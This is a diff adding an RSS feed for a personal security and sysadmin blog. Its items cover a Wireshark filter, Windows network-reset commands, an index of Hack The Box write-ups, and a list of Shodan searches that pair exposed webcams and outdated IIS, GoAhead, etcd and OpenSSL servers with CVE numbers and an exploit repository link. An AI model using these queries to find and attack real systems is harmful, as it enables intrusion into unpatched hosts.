+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tcp.analysis.flags
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Thu, 01 Jun 2017 00:00:00 -0700</pubDate>
+        <link>/sysadmin/2017/06/01/wireshark-filters/</link>
+        <guid isPermaLink="true">/sysadmin/2017/06/01/wireshark-filters/</guid>
+      </item>
+    
+      <item>
+        <title>Network Reset Commands</title>
+        <description>&lt;p&gt;Type the following at a command prompt to fully reset the TCP/IP Stack&lt;/p&gt;
+
+&lt;!--more--&gt;
+&lt;p&gt;If you’re having connection issues and you believe the hardware is good use the below to reset the TCP/IP Stack:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netsh winsock reset
+netsh int ip reset
+netsh interface ipv4 reset
+netsh interface ipv6 reset
+netsh interface tcp reset
+netsh int reset all
+ipconfig /flushdns
+nbtstat -R
+nbtstat -RR
+netsh interface tcp set global autotuninglevel=disabled
+netsh advfirewall reset
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;You can also use PowerShell (as an administrator) and type:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&amp;lt;**Get-NetAdapter&lt;/td&gt;
+      &lt;td&gt;Restart-NetAdapter**&amp;gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+</description>
+        <pubDate>Mon, 20 Feb 2017 00:00:00 -0800</pubDate>
+        <link>/sysadmin/2017/02/20/networkreset/</link>
+        <guid isPermaLink="true">/sysadmin/2017/02/20/networkreset/</guid>
+      </item>
+    
+      <item>
+        <title>Shodan Queries</title>
+        <description>&lt;p&gt;Try out these fun Shodan queries/searches.
+&lt;br /&gt;
+Shodan has grown to be a lot more useful and popular in the past couple of years.
+&lt;!--more--&gt;&lt;/p&gt;
+&lt;ul style=&quot;list-style-type:square&quot;&gt;
+  &lt;li&gt;&lt;a&gt;https://www.shodan.io/search?query=title%3ASecuritySpy&lt;/a&gt;  &lt;b&gt;SecuritySpy web cam portals&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a&gt;https://www.shodan.io/search?query=GoAhead&lt;/a&gt;  &lt;b&gt;CVE-2017-8221,CVE-2017-8222&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a&gt;https://www.shodan.io/search?query=Microsoft-IIS/6.0 &lt;/a&gt;  &lt;b&gt;CVE-2017-7269 (https://github.com/edwardz246003/IIS_exploit)&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a&gt;https://www.shodan.io/search?query=Microsoft-IIS/7.5&lt;/a&gt;  &lt;b&gt;‘Content-Type’ -‘Set-Cookie’&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a&gt;https://www.shodan.io/search?query=port%3A%222379%22+product%3A%22etcd%22 &lt;/a&gt;  &lt;b&gt;elweb.co/the-security-footgun-in-etcd/&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a&gt;https://www.shodan.io/search?query=Hipcam &lt;/a&gt;  &lt;b&gt; RealServer/V1.0&lt;/b&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a&gt;http://www.Shodan.io/search?q=OpenSSL%2F1.0.1 &lt;/a&gt;  &lt;b&gt; Servers running OpenSSL/1.0.1&lt;/b&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+        <pubDate>Fri, 03 Feb 2017 00:00:00 -0800</pubDate>
+        <link>/shodan/2017/02/03/shodanqueries/</link>
+        <guid isPermaLink="true">/shodan/2017/02/03/shodanqueries/</guid>
+      </item>
+    
+      <item>
+        <title>Introduction</title>
+        <description>&lt;h1&gt;Everyone can be secure.&lt;/h1&gt;
+&lt;!--more--&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+This site is about teaching security.
+&lt;br /&gt;
+I’m a cyber-security enthusiast. Passionate about everything around the hacking and networking world.
+&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Fri, 01 Jan 2016 00:00:00 -0800</pubDate>
+        <link>/introduction/2016/01/01/Introduction/</link>
+        <guid isPermaLink="true">/introduction/2016/01/01/Introduction/</guid>
+      </item>
+    
+
+    
+      
+        
+      
+    
+      
+        
+          <item>
+            <title>About</title>
+            <description>&lt;h1&gt;Everyone can be secure.&lt;/h1&gt;
+&lt;!--more--&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;
+This site is dedicated to networking and cyber-security knowledge.
+&lt;br /&gt;
+I’m a cyber-security enthusiast. Passionate about everything around the hacking and networking world.
+&lt;br /&gt;&lt;/p&gt;
+</description>
+            <link>/about.html</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>Writeups</title>
+            <description>This section of my website will consist of CTF boxes and my process of completing them.
+&lt;br&gt;
+I am going to try and writeup as many of completed boxes that I can as a way of progressing my skills.
+&lt;br&gt;
+I will be documenting my techniques/tools. Hopefully this can be used by anyone else who may be on their cyber-security journey.
+&lt;br&gt;
+This will likely be going in succession from easiest to hardest
+&lt;br&gt;
+Enjoy!
+---
+
+- [1. Bashed Writeup]({{ site.baseurl }}{% post_url 2019-01-01-HTB-Bashed %})
+- [2. Devel Writeup]({{ site.baseurl }}{% post_url 2019-01-02-HTB-Devel %})
+- [3. Shocker Writeup]({{ site.baseurl }}{% post_url 2019-01-03-HTB-Shocker %})
+- [4. Blue Writeup]({{ site.baseurl }}{% post_url 2019-01-04-HTB-Blue %})
+- [5. Legacy Writeup]({{ site.baseurl }}{% post_url 2019-01-05-HTB-Legacy %})
+- [6. Popcorn Writeup]({{ site.baseurl }}{% post_url 2019-01-06-HTB-Popcorn %})
+- [7. Nibbles Writeup]({{ site.baseurl }}{% post_url 2019-02-07-HTB-Nibbles %})
+- [8. Lame Writeup]({{ site.baseurl }}{% post_url 2019-02-08-HTB-Lame %})
+- [9. Optimum Writeup]({{ site.baseurl }}{% post_url 2019-03-10-HTB-Optimum %})
+- [10. Cronos Writeup]({{ site.baseurl }}{% post_url 2019-10-03-HTB-Cronos %})
+- [11. Beep Writeup]({{ site.baseurl }}{% post_url 2019-11-03-HTB-Beep %})
+- [12. Haystack Writeup]({{ site.baseurl }}{% post_url 2019-11-07-HTB-Haystack %})
+</description>
+            <link>/writeups.html</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+
+  </channel>
+</rss>
